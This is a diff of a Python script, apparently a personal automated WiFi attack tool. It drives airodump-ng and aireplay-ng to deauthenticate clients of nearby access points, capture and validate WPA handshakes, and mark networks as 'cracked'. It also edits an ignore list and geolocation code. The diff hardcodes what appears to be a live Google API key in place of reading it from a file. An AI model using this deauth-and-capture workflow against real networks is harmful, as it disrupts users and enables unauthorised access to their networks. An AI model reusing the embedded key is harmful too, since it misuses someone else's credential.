@@ -19,11 +19,12 @@ from scanner import scanner
 from watchdog.events import PatternMatchingEventHandler  
 from watchdog.observers import Observer
 from xml_arse import xml_machine
-from geolocate_api import buildJson, geolocate
 
 ####improvements:
 ####
 ###Add commenting
+#
+##!!!!!!!!Remeber Vivet Ramachandra said that the incomplete handshake captures fail unless tidied up!!!!!!!!! This is why verifications are failing...
 #
 ##create temp folders automatically and clean up when finished
 #
@@ -38,8 +39,6 @@ from geolocate_api import buildJson, geolocate
 #"ignore list of previous APs" should be selectable at cmd line avriable - almost there... can accept command line variables now
 #
 ##Geo_locate function can be broken out into module
-#
-##accept ignore list as comma seperated list
 
 #Dev null variable for subprocesses
 DN = open(os.devnull, 'w')
@@ -50,8 +49,8 @@ iface = 'wlan1mon'
 target_dir = '/home/odroid/targets/'
 output_dir = '/home/odroid/xmls/'
 handshake_dir = '/home/odroid/hs/'
-cracked_dir = '/home/odroid/cracked/'
-google_api_dir = '/home/odroid/autokwaker/' ##make this self disocver the current folder
+cracked_dir = 'home/odroid/cracked/'
+
 #debug/dev for command line arguments
 #print 'Number of arguments:', len(sys.argv), 'arguments.'
 #print 'Argument List:', str(sys.argv)
@@ -177,6 +176,7 @@ def sort_by_power(location):
 	return _sorted
 
 def create_ignore_list():
+	#ignore_list = ['petonehappinessclub', 'SETUP']
 	ignore_list = ['petonehappinessclub', ignore_arg]
 	for ignore in glob.iglob(target_dir+"*.xml"):
 		ignore_xml = xml_machine(ignore)
@@ -188,9 +188,7 @@ def create_ignore_list():
 
 #uses googles geo-location API
 def geo_locate(bssid, strength, ratio):
-	key_file = (google_api_dir+"google_api.key")
-	key = open(key_file, 'r').read()	
-	print "key:", key
+	key = 'AIzaSyACZk1FXBvka4ra3DxGg0OYHfPvDTe9Ma0' 	#unique googlemaps api key
 	url = ('https://www.googleapis.com/geolocation/v1/geolocate?key='+key)
 	#print "url:", url
 	location_data = {}
@@ -271,8 +269,16 @@ if __name__ == '__main__':
 					f_xml.geo_long = lng
 					f_xml.geo_accuracy = acc			
 					if str(f_xml.cracked) == "False":					#Test if AP has already been cracked	
+#get geo location details from google api here.......
+						#lat, lng, acc = geo_locate(f_xml.bssid, "0", "0")	#power and snr to be added in future.....
+						#print 'lat:', lat
+						#print 'lng:', lng
+						#print 'acc:', acc
+						#f_xml.geo_lat = lat
+						#f_xml.geo_long = lng
+						#f_xml.geo_accuracy = acc
 #start airodump-ng focussed attack using deets parsed from xml
-						print "Creating focussed scanner object:", f_xml.name
+						print "Creating focussed scanner object"
 						f_scanner = scanner(iface)
 						#print "f_scanner:", f_scanner					#debug
 						f_airodump_parent_conn, f_airodump_child_conn = Pipe()
@@ -288,9 +294,9 @@ if __name__ == '__main__':
 						'bssid':f_xml.bssid,
 						'client_MAC':(f_xml.client_list),	#expects a list
 						'conn':deauth_child_conn})
-#start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
+	#start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
 						f_airodump.start()
-#start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
+	#start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
 						f_deauth.start()
 						time_started = time.time()
 						f_scanning = True
@@ -307,19 +313,11 @@ if __name__ == '__main__':
 									if handshake_file == (handshake_dir+f_xml.name+"_scan-01.cap"):     
 										valid = validator(SSID=(f_xml.name), 
 										BSSID=(f_xml.bssid), 
-										capfile=(handshake_file))
-										print "Stripping handshake cap file of unnecessary packets"
-										valid.strip(handshake_dir+valid.SSID+'_strip.cap')
-										print "Validating stripped cap file..."
-										strip_valid = validator(SSID=(f_xml.name), 
-										BSSID=(f_xml.bssid), 
-										capfile=(handshake_dir+valid.SSID+'_strip.cap'))
-										strip_valid.validate_handshake()
-										strip_valid.analyze()
-										print "Validation result of stripped handshake capture:", strip_valid.validation_result
-										print "Analysis result of stripped handshake capture:", strip_valid.analyze_result
+										capfile=handshake_file)
+										print "Validation result of handshake capture:", valid.validation_result
+										print "Analysis result of handshake capture:", valid.analyze_result
 #when handshake detected stop focussed attack			
-										if strip_valid.validation_result or strip_valid.analyze_result == True:			
+										if valid.validation_result or valid.analyze_result == True:			
 											print "Handshake captured, my job here is done..."	
 											f_xml.cracked = 'True'
 											f_xml.xml_tree()
@@ -329,10 +327,19 @@ if __name__ == '__main__':
 											deauth_parent_conn.send(f_scanning)
 											f_airodump_parent_conn.close()
 											deauth_parent_conn.close()
-											time.sleep(1)											
+											time.sleep(1)
+#process handshake file here: strip, analyze and validate	
+											print "Stripping handshake cap file of unnecessary packets"
+											valid.strip(handshake_dir+valid.SSID+'_strip.cap')
+											print "Vaidating stripped cap file..."
+											strip_valid = validator(SSID=(f_xml.name), 
+											BSSID=(f_xml.bssid), 
+											capfile=handshake_dir+valid.SSID+'_strip.cap')
+											print "Validation result of stripped handshake capture:", strip_valid.validation_result
+											print "Analysis result of stripped handshake capture:", strip_valid.analyze_result
 											break
-#time-out in case no handshakes are captured
-##make this option (length in seconds) controllable via args???			
+	#time-out in case no handshakes are captured
+	##make this option (length in seconds) controllable via args???			
 							if f_scanning == True:
 								print "Focussed attack now running for: %.0f seconds" % (time.time() - time_started)
 								if time.time() - time_started >= 30:
